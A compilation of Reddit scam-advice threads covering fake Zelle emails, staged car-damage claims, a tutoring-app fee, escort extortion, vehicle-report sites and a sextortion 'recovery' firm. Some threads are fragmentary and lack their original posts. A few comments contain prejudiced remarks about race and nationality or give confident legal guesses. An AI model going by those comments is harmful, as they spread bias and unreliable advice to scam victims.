Body: Hi! I‚Äôm selling an ROG Ally on Facebook marketplace. The buyer asked if I have Zelle or Venmo, and I have Zelle so I agreed to take payment that way. However he asked me if I could send an email for Zelle because his business account requires an email and not a phone number. When I received a confirmation email it was from onlinezellesecuredtransfer@gmail.com. The email also told me that I have to make my account into a business account before accepting payment, somehow making the total to $800? I have never received a Zelle confirmation this way, it has always told me that the money has been deposited into my account but the email is always from my bank. Could this be because he has a business account? I‚Äôve never seen anything like this.

- There is no such thing as a Zelle business account. The emails are faked, there is no payment, they'll ask you to refund the overpayment even though they sent you a total of $0 from a non existent account.
- It's a !fakepayment scam. Report the account as a scammer and block.

Also be aware that most all cash apps have in their terms of service that they are ONLY to be used with known/trusted contacts and treated like cash. If you choose to use them with a stranger and are scammed, it's totally your fault/responsibility and the app isn't going to help you at all.
- Zelle emails come from Zelle. They are a huge company and can afford emails using their own domain. Zelle will never send you an email from a free gmail, hotmail, aol, yahoo, etc account. If you do get an email from any of those services claiming to be Zelle or PayPal or your bank - automatic scam.
- An email "from" Zelle, from Gmail, didn't tip you off?
- Also, report the email to Gmail as phishing.
- On Facebook Marketplace you really need to insist upon cash in person only.
- Next time you want to sell something, do it on YOUR terms.
- > However he asked me if I could send an email for Zelle because his business account requires an email and not a phone number.

Never honor these requests. The *only* reason that people make them is so they can send fraudulent "confirmation emails" like the one you received.
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Fake payment scam.

The fake payment scam occurs when someone tries to trick you into thinking that you have received a legitimate payment when no such payment has been made. The most common method they use is sending you an email meant to look like a payment confirmation. In some cases the emails will be almost indistinguishable to a legitimate email sent by the payment service. Scammers are known to also show you screenshots instead of an email. Never trust a screenshot a stranger shows you, because it is probably doctored.

Scammers [spoof](https://en.wikipedia.org/wiki/Email_spoofing) the 'from' email to match an official address, and make you think you received a legitimate email. To combat a fake payment scam, verify online payments by logging in directly to the service. Do not check your junk folder, and do not assume a payment is legitimate based on an email alone. If a payment isn't reflected on your account and the person you are dealing with insists they have sent it, call support and ask about it. [Here](https://i.imgur.com/X9xn8uw.jpg) is an image of a scammer trying to pull off a fake payment scam. There is also a variant of the fake payment scam where you will receive a legitimate but fraudulent payment.

A variant of the fake payment email is just an advance fee scam: the scammer tries to convince you that your funds are on hold, and that you have to upgrade your account by sending the scammer some money to authorize the payment. No payment processor works like this. If you think you're dealing with a scammer, you're probably right. Always trust your gut.

Title: Curious about an incident several years ago. Was it a known scam attempt?
Body: Several years ago I took my family to a popular amusement park. My wife was driving, and when she pulled into a parking spot I suggested that she pull forward into the spot in front of us so we wouldn't have to pull out into traffic in reverse when we left. She declined because it would be hard to load things into the trunk with a car behind us.

That night when we were getting in our car someone approached us, and demanded to know if that was our car and asked what the fuck was wrong with us. They told us we hit their car when we parked, and showed us that our license plate holder was very gently touching theirs. Given the discussion my wife and I had about which spot to park in, we already know that was literally impossible.

They would not let up, got angry, yelled, cursed. They showed us their parking receipt trying to prove they were there first, but ours was time stamped one minute earlier. We refused to share insurance info and suggested they call the police. They did, we shared insurance insurance using the police as a middleman, and gave our statement.

We reported the incident to our insurance company and were eventually informed that no claim was ever filed against us for this incident.

I'm thinking, was this an extortion attempt? Is this a known scam? Maybe they were hoping we'd pay to make the problem go away without involving police and insurance and higher insurance premiums. Another person could easily be self doubting, submissive, or scared enough for it to work. I looked for public records with the name of the guy, and found that he had filed and lost several lawsuits for vehicle related incidents in another state.

- Your last sentence is the clue. He likes to make false claims and hopes that someone will bite the bait and pay him for no reason.
- Well on the bright side, it sounds like that idiot wasted several hours setting up the con, and you didn't fall for it. Very cheeky of them to actually wait for the police, despite the fact that they arrived right after you.  Which, by the way, is consistent with their having profiled you and followed you into the lot...
- I remember a scam like this was done on exit ramps where someone would stop, and then back into you.  They always claimed you hit them while they were yielding for traffic. Dashcams solved a lot of these attempts, however.

My first marriage, someone did this to my wife. The person didn't know she was an insurance adjuster. They backed into her SUV pretty hard, knocking her off the road over a curb. The only way that the SUV could have ended up like it did was if the other person had backed into her. My wife had a digital camera, which was kind of rare at the time, and had a ton of photos of the accident, the person trying to move their vehicle into a different position post-accident, and so on.  She called the cops, too.

The woman tried to intimidate my wife, but she held fast, and waited for the cops to arrive since now she couldn't even drive the vehicle. Woman refused to exchange insurance. Woman threatened all sorts of things until the cops came by, then changed her story twice, and my wife showed the officer the photos of her moving the car to a better angle. 

Woman was uninsured, of course. The SUV was "totaled," in the accident which pissed me off because we had just gotten new it a year ago, and needed it for my wife's wheelchair. But the woman hit her so hard backing up, it bent the frame, and it was cheaper for the insurance to pay us for the car's worth than fix it. 

I have never bought a "new car" ever since. They really drop 40% in value once you drive it off the lot. We ended up having to get a piece of shit Kia van, used, which had no end of electrical problems.
- Pretending someone carelessly damaged your property and they owe you compensation is probably among the first three scams ancient hominids ever invented. Actually, I wouldn't be surprised if similar behavior could be found in monkeys or crows. 

That person backed into you on purpose to get a payout and then didn't file anything because you got too ornery about it and they were hoping for someone who'd be intimidated by the anger and yelling and immediately consent to give them money or at least lack the wherewithal to defend themselves against the claim.
- This scam also takes place in parking structures, several attempts have been reported here in the past months, both in Europe and North America.

It unfolds like this: A woman is parked next to a wall or a pillar in the parking structure. You are walking past her. She stops you, and asks for help in backing her car out of her space, she says she's had problems backing up, she's in a tight spot, etc. She is persistent. You say no, and walk away. Later you see her easily back out of the space. Her vehicle has a large scrape and dents on the passenger side. If you had moved her car, she would have accused you of damaging it.
- You did exactly what he didn't want to do - you said "let's report this to the police" and he had no choice but to play along.

You are likely correct about his scam, based on that last comment.
- Old scam, still happens. They think you will offer them cash so it doesn't show up on your auto insurance. People have tried it twice on my kids in their twenties. "Our attorney said to call police to verify and then turn it into our insurance. Let's get started" is a useful thing to learn to say. The scammers go away. You don't have to have an attorney to say it.
- > was this an extortion attempt?

Possibly. They might also just have been as asshole.
- Thieves steal and scammers scam! That‚Äôs how they survive.
- Some people tried pulling that shit on me before about a decade ago. It was at a place that caters to kid's birthday parties.

They said I came into the parking little too fast and sped into the parking spot, hitting their car.

I said "nope".  Call the cops if you think I'm lying, I ain't giving you shit about my license or insurance.  

Next thing, a couple dozen black folks came out and tried to intimidate me into bitching out and falling into their scam.

They eventually walked away. No dirty looks or any other bullshit from them in the building.

A lot of the times, bullys will test people's nuts, looking for the easy dumbasses willing to play along with their bullshit.
- Doubt, scammers won't waste their time with the cops. Most likely just a crazy person.
- I guess the court fees from filing lawsuits prompted him to use other methods? Fun fact, I also found out he was once fined by park rangers in that state for drunk boating.
- I hate that sometimes even when you are in the right you bear so much of the burden for irresponsible or criminal people.  Drove my new car off (my first at age 45 was so proud) off the lot - fully insured - went 4 miles and was slammed into from behind when traffic stopped suddenly on the highway - the uninsured motorist had all fake information and  my uninsured motorist coverage made it so I had to settle for a used car.
- Crows are way too intelligent to pull or fall for a scam this stupid.
- As an aside: buy a dashcam.
- Sounds like a serial fraudster.

Title: Got scammed by a home tution app(ghar**siksha)
Body: I am a college going student in the last semester of my course as I wanted to pursue my career in teaching i wanted to get some experience. I installed this application (gharpesiksha)in my smartphone. Suddenly there employee started calling me and tried to explain me how this application worked. I didn't paid too much interest but than he started saying that since these days are for preparation parents needs teacher to help their children in revision. I denied by saying that I don't have much time. Somehow he convinced me to teach online and in return of that I'll be getting 10k-12k. He played very smartly by saying that parents are in conference call and he can make me talk to them if I'll buy there subscription plan of rs.3550. For me it is a huge amount but he promised me that I'll be getting 10k-12k in advance from the parents. I paid that amount and now in the application I am able to see that this plans validity will last for 4 months and in these 4 months i can contact 20 parents to teach their children but there is a daily limit of contacting only 3 parents. No online coaching only home tutions I'm able to see. It's my cousin's marriage in february first week. My parents sent me that money to do shopping but now I have loosed that money. I feeling like a fool as being a girl i cannot visit every unknown place to teach. I have no money in my account. It's very hurting and frustrating that I have trusted them. My parents are really nice they love me more than anything in the world. I told them everything and the consoled me and said that they'll send money to me again. But now I want these people to get caught. So never trust such applications i request everyone.

- What's so bad about "PE" that you felt like censoring it? This asterisk abuse has to stop.
- I mean, I don't know if this sounds as much like a scam as a high pressure sales tactic. It definitely sucks for you, but that's why you have to read all the fine print BEFORE you commit to something like that.
- Sorry for your loss OP but their reviews clearly mention how the sales team is scamming tutors.
- The money is gone and there's no way to catch the scammers. 

The good news is that it wasn't a huge amount of money (it could have been much worse), and now you will be much more careful for the rest of your life. Your generation is very used to doing everything online, but there are many things you'll need to do in person, such as verifying a financial transaction or a program. Talking to real people, confirming that they are who they say they are - these are skills your generation is going to have to learn. 

And the other good news is that you have good parents, who support and love you, and understand the difference between making a mistake and being a bad person. When you're older and have a degree and are working, you'll be able to pay them back.
- Maybe they didn't want any search results to come back to their reddit? \*shrugs\* I agree
- I didn't see those reviews at that time
- Thanks
- When looking up the actual name I also got a result with another "ghar" in place of the "pe".

Eh, whatever.
- Now you know to look for things like that and will do so in future.

Title: "Employer" finally wants to send me equipment, after I tried to file a police report about their suspicious behavior.
Body: This is a follow-up to a [post](https://www.reddit.com/r/Scams/s/YvnGNrslsk) I made over a week ago. I applied to this remote job, talked to the owner over the phone, no face-time. He asked for weird documents, such as my diploma, SSN, and mistakenly called me an intern on the contract. Then when we planned to get started, he told me that he wants me to make an intuit quickbooks account for payroll, before we met at Starbucks to get my laptop. He calls in sick on the day we were supposed to meet, but still goes to work. I tell him to send me the laptop before I made the account, but he insisted that I already make the account. 

After a week of no show or no updates, I go to my local police department to tell them about the situation. The police looked at all the emails I provided them, then the police actually talked to the owner, and confirmed that they are a legit business. Then the police refused to take my documents or file a report, because I didn't suffer any damages, or there is no confirmed attempt of theft. 

I'm honestly very disappointed in the police. I hope if I end up getting scammed, they won't give me some excuse that they can't punish the guy. 

The owner then finally calls me, and tells me the reason that he didn't follow up was because he was in the hospital at the time. The police told me that they decided to rescind my employment, but then the owner told me in a VM that they rescinded (or ghost me) was because I "resisted". 

He now says we will meet next week at the Starbucks with the laptop as agreed. 

Even though the police confirmed the guy is real, this all still feels very weird. I finally opened the account, but I put in a fake name and I did not put any banking information yet. 

Is this an identity theft scam? A wire fraud scam? Or could it possibly be a money laundering scam? 

What is wrong with this company?

- Job scammers don't typically meet up with anyone; they do all contact online and rarely actually speak to anyone. So far, the only thing that is going on sounds like a very disorganized and confusing business. There was nothing the police could do that they didn't do already - no crime has been committed. None of use could even begin to answer whether this is a scam or not - there is nothing to work with other than the boss being supposedly sick and very poor communicator and onboarding a new employee shouldn't be like this at all.

But if it was me, this business/boss sounds incredibly bizarre, and if it's any example of how they run a business, I would personally not want to be an employee there at all. Suggest you walk away and look for employment elsewhere.
- After all of this you still want to work for them? If their hiring process is such a mess, I shudder to think how the rest is run, be prepared to have to wait a while before getting paid. 
If I were you I would look for a job at another company.
- Disappointed in the police, are you kidding? They did all they could do, and you were not scammed.
- Who did the police actually contact?  The guy and the phone number in your emails?

You will find out more for sure next week if you choose to go to Starbucks.
- Can't tell if this is a scam, but it's at best shady. Drop it and find a job where you won't be wondering every minute if you're involved in something criminal or about to be ripped off.
- LOL.

You may want to spend some time today looking at all the forms the various "remote" job scams take on here.  Was it a remote "data optimization" or "data entry" or "bookkeeping" job or something like that which pays modestly above-market wages?

Don't you find it odd that you have literally *never* seen this individual?

Who did the cops verify?  Did they just call whatever # you had?  It's literally 100% possible they could be talking to some scammer in western Africa on a VoIP number.  I mean, what else are the cops going to do?

Cops:  "So, um - sir ... you say your name is William Gates, is that correct?"

Scammer:  "Yes, that is my name."

Cops:  "And you say you run this software company called ... um ... 'MikeRoweSoft' is that correct?"

Scammer:  "Yes, that is the name of my company."

Cops:  "Ok, thank you for your time."

$100 says you don't end up having coffee with this individual at the newly-scheduled time.

The fact that you can't see the very first thing them wanting you to do involves bank accounts ... tells me you don't fully understand that these are offshore scammers who have nothing to lose by continuing to try to tell you one story after another until you believe it.
- He‚Äôs never going to show. Lock your credit, because you gave them your SSN, they‚Äôre already using it. You‚Äôre not getting any money from them, ever.¬†

Look at where you posted this. You already know it‚Äôs a scam. Better call the bank also and review every withdrawal.
- Can't tell if this is just a flaky employer or you're just being strung along for giggles.  Doesn't feel like a classic job scam, but it's pretty sus.
If it is some sort of scam, you've made it plain to the scammer that you're so desperate for employment that you'll go for anything remotely plausible.

Title: I got threatened by an escort "manager"
Body: Recently I have been feeling lonely and last night after a full week's hard work I stupidly went an an escort website for an outcall. I found this profile and had several text exchange using my cell phone, but she was asking for a deposit before she can come. I refused to pay and that's it. The next morning, I received a text message from another number claiming to be the manager of the girl I was bothering with. He said he knows where I live and I can either settle with him over the phone or in person. At the end of the text message, he did send my real name and accurate address. He then kept calling me and saying I wasted their time last night and lost money from other VIP customers due to me. 

I'm now really scared. I knew this was a bad idea and I was just so stupid in first using my own number and second going to this shady website for outcall. I've really learned my lesson here, will never do this stupid thing again. 

Should I report this to the police? I'm feeling really threatened now that they know my name and where I live. What is my option? I'm really worried. Please help share if you have any similar experience before. 

Thank you so much.

If the cartel was killing people it would be big news on CNN. If they killed everyone they threatened, bodies would be stacked up in your neighborhood. 

Looking for an escort is not shameful. The problem is that most of those sites are scams, they take a little bit of info that you give them and threaten you to try to make money. They want your money, nothing else. If you don't pay, they will eventually stop bothering you. 

The cartel is not going to bother you or your family. They make millions of dollars running drugs and other crimes. The cartel isn't messaging you; the escort extortion is actually run by scammers on another continent, probably in Africa or southeast Asia. When they contact Europeans, they pretend to be Albanian mafia.
- Was it Tony again?
- Better give him all your money lol 

Just block it wtf are you even asking
- I've seen this near exact scenario many times now, it's a scam, they'd have taken your deposit and you'd never see a girl come ever, this is just an extension of the scam, tell them to F off and block.
- Just meet people organically instead of buying human beings and incentivizing human trafficking. Scammers are looking for people like you to prey on.
- Watch Punch-Drunk Love.
- Darn. I bet all unsolved murders are EXACTLY that scenario. Mind. Blown.
- Yeah, that makes more sense now. Thank you.
- Thanks for your comments. Yeah I saw a couple of other similar scam posts, but I didn't see the real address being revealed in those posts, so I just thought what is happening to me seems a big unique and more serious.
- Thank you for your comments and the reassurance.

It's a very common scam, and the scammers are not affiliated with cartels or crime groups, they are simply normal scammers using a threatening script.

- Yes exactly! he said his name is Tony and texting and calling from a 561 number.
- Points taken! Thank you.
- Thank you for your reassurance!
- While I agree with the sentiment here, OP never tried to buy a human being.
- Thank you. This serves a good wake-up call. I totally agree. Hard lessons learned here.
- Horney women everywhere. Maybe cost dinner.
- Google your name. Or your friends/family/coworkers names. Its not hard to find people's addresses
- Not unique, not serious.
- What they are really after is your partner's contact information, because that usually gets their targets to pay. That's why they asked you to tell them where you live, and you told them - maybe not the full address, but plenty enough for them to know. 

There is no pimp and there is no girl. The guy you tried to get to visit you for a sexy time and the guy you're having phone conversations with are the same person, and they are only talking with you because you choose to talk to them. Don't. Don't pick up his calls. Don't answer his texts.
- Your name and address are connected to your phone number. If phone numbers didn't have names attached to them, they've be kind of worthless. It's not hard to source that information from the web; there's a whole category of websites that sell it, since it's not considered sensitive. So the fact that this person, who knew your number, could find your name and address is no cause for concern.

- r/antimlm is covering Epicure today.
- "How did she JUST lose thousands when they had their mitts on her for 18 years?" would be the first question.

Also, take a look at r/antimlm
- All MLMs are based on a few people getting very rich, a few more making some money for a while, and everyone at the bottom getting totally screwed. Anyone who participates in an MLM knows this, and knows that their income is based on harming other people, often their own friends. 

The whole setup is fundamentally unethical, so nope, no sympathy.
- How much did she earn in 18 years?
- i saw :(
- i dont know.. must been some kind of rug pull gained her trust
- i totally get your point of view thanks for sharing.
- my mom was also at the top she was a leader and she made a decent living
- idk some weeks shed make around a thousand one week she made two bucks
- What's the point in telling us to ask you questions if you have no idea?
- she always gets her tickets for work trips early since shes done multiple trips with them. their was one in nashville in march she also has a bunch of unsold stock right now
- Yup, based on the people downstream being ripped off. There's no way to spin an MLM that isn't based on this reality.
- i mean they gained her trust taking her and my family on trips and she made a decent living last night the owners went MIA thats all i know
- sadly. plus most of the spices were ass
- Ok, again: How does that mean she JUST ***lost*** thousands?
- Comment of the Day. Good on you for keeping a sane sense of humor about it, and staying clear of it yourself.

Title: VehMyPro.com car report scam
Body: I am currently selling my used car and had someone approach my requesting a vehicle history report. They were adamant that I use VehMyPro.com over other sites. Before I fell for the scam, I did some brief digging and found the website was registered only 2 weeks ago, to a location in Iceland with a redacted name and email for ‚Äúsecurity purposes‚Äù.

The person said they have to take a day off work tomorrow to come look at it, and wants the report before making the trip to come see it. When I said I didn‚Äôt want to pay $45 for a car report when I have all the maintenance records, they said they would pay me back when they saw me in person. Obviously sounding fishy, I researched more and found it was a scam.

I just wanted to see if anyone else has experienced the same, and if not, put the word out there that it is indeed a scam.

- Common !car scam.
- Had you fallen for it, not only would you be out $45 but the scammer would also have your sensitive credit card information.

Good job doing the investigative work BEFORE making a decision!
- !whois VehMyPro.com

Yes, this is a frequent scam. Never pay money when you should be the one receiving money.
- Forget scams: do not provide a vehicle report to a potential buyer. Any report. Don't even make objective statements about its condition. Sell the car as-is. Let the buyer check it out and rely on their own assessment.

If you provide the report, you're going to find yourself on the hook for any deficiency in that report that shows up later. If the buyer wants a report, they can get their own report. Then it's on them if the report is inaccurate.
- This is a very common fraud; the "buyer" insists that the seller use a specific, and heretofore unknown, vehicle history reporting site, and refuses to take a report from a well-known site. As I'm sure you've guessed, the "buyer" is the person behind "VehMyPro." They would take the $45, which would give you a basic report available elsewhere for less, and then disappear, since they want the money and have zero actual interest in the automobile.
- Imagine that this is a scammer (because it is). What do they want?  Your money.  How will they get it?  You putting your CC info onto a website they control.
- As the seller, it‚Äôs not incumbent on you to provide any sort of vehicle report - a lot of people do a car fax themselves - but insisting on this is akin to the seller paying for a mechanic to do a buyer‚Äôs check on a vehicle  for each potential customer. 

It‚Äôs on the purchaser to pay for these types of reports and mechanical checks, not the seller. 

These scammers will say something like ‚Äúmy grandpa always said to use this site scam-vehicle-report(.)com - which is usually hilarious because the sites are typically less than a month old. They‚Äôll also say they‚Äôll add the cost of the report to their purchase. 

As you have surmised, it‚Äôs a scam, a well known one. 

But stand your ground, unless car sales is a regular occupation for you, they‚Äôre not going to give you a bad review on Yelp or whatever.
- It's 100% a scam. They aren't even located near you. They have no interest in seeing your car. 

Block them
- I don't understand why someone would still doubt their judgment with all that info (newly registered domain, pay X amount so I can steal your credit card info and empty it).

Would you completely lose your chances to sell a car if you ignore that scammer? Would you trust the site if I tell you it's legit? (yeah I could be scammer's accomplice) Don't ask. Use your common sense.
- Yep, scammers will create a fake ad (rental, job, car) and claim you need to do a credit report before going forward. Often they claim it will be "refundable" later.

The scam may go different ways - often it can simply be to get your personal and credit card information and or charge bogus fees.

Another common scam is an affiliate link abuse scam. The scammer have a link (CLICK HERE) or creates a fake website that will forward you to sign up on a different credit monitoring site (like transunion, freecreditscore etc) when you sign up, the scammer gets commissions from their affiliate link. You are also then put on a subscription from the site that may be hard to cancel. 

Don't Buy Vehicle Reports from Scammers

Steering clear of vehicle history report scams

[https://consumer.ftc.gov/consumer-alerts/2018/10/steering-clear-vehicle-history-report-scams](https://consumer.ftc.gov/consumer-alerts/2018/10/steering-clear-vehicle-history-report-scams)
- You are not required to provide that, furthermore if they wanted it they would pay for it themselves.
- Hi /u/great_molassesflood, AutoModerator has been summoned to explain the Car sales scam.

If you're buying a car, a scammer will list a car on a marketplace site and will ask you to email them. They will tell you that they will ship or otherwise transport the car to you and allow you to inspect it. They may use the name of a company like eBay or Amazon to make the scam sound more legitimate. The scam is that the car does not exist, despite whatever pictures you have received, and you will be asked to pay for the car using gift cards, crypto or irreversible wire transfers..

If the seller is real and wants to actually meet, you may face a different type of scam (which involves a run down, stolen or otherwise bad deal of a car). To prevent this, you need to meet at a mechanic's shop you trust and have a full inspection of the vehicle. Remember all sales are final when dealing with used cars. The seller needs to come to meet you, so as mentioned above, the offer for a courier doesn't help.

If you're selling a car, the scammer will try to have you pay for a verification on a scam website, some VIN check lookup or certificate of records of some sort. Remember you're the seller, you set the terms. If you want to provide some certification, use a website you trust. They can do their own verification if they don't trust yours. And also, they can try to pull a fake check on you. No buyer is sending a courier to pick up a car they haven't seen.

And again, if the buyer is real and you actually sold the car, the same rule applies: all sales are final, so do the proper paperwork, consult a subreddit dedicated to car sales and make sure the transfer is completed.

Title: Payed a company and now I regret it
Body: I didn‚Äôt really know what to put for a title so anyway‚Ä¶ So in October 2024 I was a victim of a sextortion scam. Being in the high stress situation I was in, I agreed to pay for a service from Digital Forensics Corp. A few months down the road I did some more research here on Reddit and on some reviews and realized that this company isn‚Äôt good at all. So now I want to know if there‚Äôs a way I can just cut off this company (I know that sounds stupid). If you want to know the details of why the company is bad you can look at my old Reddit post. I sent an email to them telling them that I have been dissatisfied with my case and demand my contract to be cancelled. I got no response so I had to send a follow up to then I finally got a response telling me ‚Äúthis has been escalated to the highest management sir‚Ä¶.‚Äù And I just got a text today telling me I will be charged tomorrow. It honestly feels like they tried to squeeze more money out of me than the blackmailer. Can someone please just give me some advice about this case? I really don‚Äôt want to be stuck paying this horrible company.

- Do you realize your extortionist and agency are the same person, who cashed you twice?
- > you can look at my old Reddit post

Don't make us do your work for you.

The company is also a scam.  A !recovery scam.  They're just stringing you along since they already know you're a sucker that will cough up money.
- Sounds like after the first scam you fell for a !recovery scammer.
- Just cut the cord. It's pretty clearly a !recovery fraud. There's nothing they can do to you if they stop paying. Go to your bank and tell them that this company is no longer authorized to bill you. If that doesn't work, you may need to get a new card. If so, make sure that you have tokenization and automatic account updates turned OFF, otherwise, they may still be able to bill you. If they're sending you invoices, just quit paying them.
- You need to cancel whatever form of payment you are using to pay them. Don't keep sending them money! Wishing you the best of luck
- UPDATE: 

I just want to thank everyone here who has taken time to help me out with this issue. I have been stressing about this since it happened so this means a lot to me. I have decided I am going to call my bank and make sure that no more payments go through and I am going to also ignore any messages, emails, and calls I receive from them because a lot of people are saying that they won‚Äôt do any legal action (hope so). So once again thanks to everyone that helped me!
- The problem with a sextortion scam is even if they have pictures or whatever, they only have pictures. If you pay them, then they have pictures and your money, and no reason not to keep taking more money. Without looking up your original post, they most likely have nothing to start with and/or won't do anything with it.
- You will need the advice of an actual lawyer. Unlike the run-of-the-mill recovery scammers, DF is a real company registered in the US, and the contract you signed with them *is* enforceable. But - it's not that simple. Contract law is complicated, and you could argue that they didn't live up to their side of the bargain. It really depends on what the contract says.

From what we have seen in r/sextortion, they haven't actually followed through with threats of legal action when a "client" simply stops paying. But - the reality is that they *could* if they wanted. So you need to tread carefully. Your best bet is to have an actual lawyer look over the contract and tell you what your options are. Most large cities in the US have lawyer referral programs that will get you a free half-hour consultation. I suggest you take advantage of that.
- STOP PAYING ANYONE.
- Contact your credit card company or whoever handles the payments and have them cancel the card or give you a new one.
- Hi /u/Marathon2021, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- So what should I do? If I stop paying them they will ‚Äúthreaten to start legal action‚Äù but I‚Äôve also seen people say to just ignore it and they don‚Äôt do anything. Also sorry for that. I didn‚Äôt feel like writing all the details I got lazy lmao.

- I ‚Äúsigned‚Äù a contract though and they threaten to proceed with legal action if I don‚Äôt pay. Are you sure this is the move? Sorry I am just stuck in the middle and don‚Äôt know what to do.
- I tried to look for the contract to see if they sent me it back and they didn't. When I went to look at the contract link that I pressed when I signed it originally, I wasn't able to access it.
- Those are recovery scammers.
- I highly doubt this company will be starting any legal action. Just block any future payment ASAP.
- Stop dealing with them. Block them. Forget about them. The money is gone, and they will go on until they‚Äôll get your very last penny and more. Once you‚Äôre gone, they‚Äôll go after someone else.
- It's still not our responsibility to do your work for you.

That being said, they won't start any sort of legal action. Once they realize you won't pay them anything else, MAYBE they'll send you some fake lawsuit notification, and when you ignore that, they'll move on.
- It's a guy in a Chinese sweatshop.¬† There's no lawyers, no one in your country, they committed a crime...¬† it's all fake, empty threats.¬†¬†


Real talk, you need to put away the shame and talk to your friends.¬† The only way to stop scammers, is to educate others.¬† Tell your bros that the ONLY people looking fir dick pics online, are scammers.¬† That any pic posted online, can come back to haunt you.¬† That dick pics are not life ending and like 1/3rd your generation has them floating around.¬†¬†


Finally and I can't stress this enough, any pic released by someone malicious, is Obviously AI Fake!!!¬† Instead of freaking out, just tell your friends and family that some random email threatened to send fake nudes and not to open the obvious mal-ware.¬† Just tell people and it's no big deal.¬† There's bloody apps to face swap porn specifically, it's such an empty threat.¬†¬†


Seriously, go tell your friends not to send nudes to strangers and definitely don't respond to sextortion scammers, or recovery scammers for that matter because it's the same guy.
- They are most likely in India or Nigeria and will not threaten anything legal.  One of their other people might pretend to be the law or something else , IGNORE and BLOCK all calls.
- What legal action? They are scammers in another country doing illegal stuff.
- Yes. Just stop giving them money. Then block them. When they pop up under a different name or number, block that one, too. You probably didn't need to, but if you're worried about legal action, familiarize yourself with how the legal process works in your area to avoid falling for additional scams.
- They aren't performing their aspect of the contract, which is no surprise since they're recovery scammers. They're not going to expose (hah) themselves to the courts to sue, because they have no chance of winning. Their threat is empty, they're just trying to threaten you into not cancelling.

Contracts go both ways. A contract where you pay for nothing isn't going to be upheld in court.
- NAL, but if whatever "contract" you signed was entered into by them in bad faith, as part of a scam, with no intent or ability to deliver what they promised, then you probably have nothing to worry about.  Cut off any future payment, block and ignore.
- > I ‚Äúsigned‚Äù a contract though

Okay. I‚Äôll bite. How does one ‚Äúsign‚Äù a contract? You either signed or you didn‚Äôt. If (and this seems to be a mighty big ‚Äúif‚Äù) you signed a binding contract, to get out of it, you‚Äôd have to demonstrate that this supposed ‚ÄúDigital Forensics Corp‚Äù hasn‚Äôt delivered on their end, and are thus in breach.

That said, two things. You need:

1) A lawyer to look at the contract, and determine if it‚Äôs even enforceable. (I, for my part, suspect it isn‚Äôt.)

2) To start thinking, and stop emoting. Step back, and take some time to clearly understand your situation for yourself, rather than running to Reddit for answers.
- a contract with a scammer , STOP IT , block them , f\*k their contract its from a scammer in another country no legal standing its all bullshit.
- WTF is the matter with you!! They are scammers - their contract is BS! What are they going to do? Sue you for what exactly? You should be threatening to sue them for fraud and asking them for a refund. Post the name of the recovery scammers and I will prove to you they are scammers.
- The people on r/legal recommended that you stop paying. People here recommend that you stop paying. 

Does this company have a real address in your country, that you can verify? Like an office?

Most of these scams are run out of compounds in southeast Asia or Africa, where the laws of your country don't apply. And they are criminals, so any contracts they ask you to sign are just bullshit. Scammers love to make you think that you signed a legal contract, because they are scammers.

If you still have concerns, take a copy of the contract to a lawyer and ask for advice whether it is legally enforceable or not. The lawyer may charge you, but it won't be more than the outrageous exorbitant high fee that the scam recovery company is charging.
- They're scammers. They won't take anyone to court.
Ring your bank and tell them you've been scammed.
Then report them to the police
- Exactly. The reason you are afraid is because they want you to think they have some sort of legal way to punish you. They do not. That fear is what is making you continue to send them money. They have no power over you. 

Block them. If you have a card or account on an auto-withdrawal, cancel that payment. You might  have to get the bank to give you a new account and/or cancel whatever card you are using and get a new one. If you see a payment in process, dispute it with the bank. 

Ignore any and all follow up emails, texts and phone calls from them. They will do nothing except blow off a lot of hot air. They will eventually stop once they realize they can get no more money from you.
- Dawg the signing of the contract was me pressing a button idk if that counts?
- Digital Forensics Corp. is the company
- I‚Äôve looked through your posting history, and *you were directed to a post on how to deal with these people*. If you can‚Äôt be bothered to even understand whether or not you‚Äôve signed a legally binding document, you‚Äôre wasting our time.

So, my advice to you ends here: **Read the post you were sent to, and follow the process laid out there.**
- That is not how contracts work. 

Block them. Ignore them. If you‚Äôre not going to take our advice and argue with us, then why are you here?

**No legit company/trader/investor is using WhatsApp or Telegram. No legit company/trader/investor is approaching people on X or through a "random" text message.**

Search this sub for 'crypto' to find many, many stories of scams with fake crypto trading. People have lost thousands in these scams, they have lost all of their savings.
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Fake crypto wallet scam.

Fake cryptocurrency websites and apps controlled by scammers are becoming more and more common. Sometimes the scam begins with a romance scammer who claims that they can help the victim invest in cryptocurrency. Victims are told to buy cryptocurrency of some kind using a legitimate cryptocurrency exchange, and then they are told to send their cryptocurrency to a website wallet address where it will be invested. Sometimes the scam begins with a notice that the victim won cryptocurrency on some website, in this case messages will often be sent through Discord.

In either case, the scammer controls the website, so they make it look like there is money in the victim‚Äôs account on their website. Then the scammer (or the scammer pretending to be someone official who is associated with the website) tells the victim that they have to put more money into the website before they can get their money out of the website. Of course all of the money sent by the victim has gone directly into the scammer‚Äôs wallet, and any additional money sent by the victim to retrieve their money from the website will also go directly into the scammer‚Äôs wallet, and all of the information about money being held by the website was totally fake.

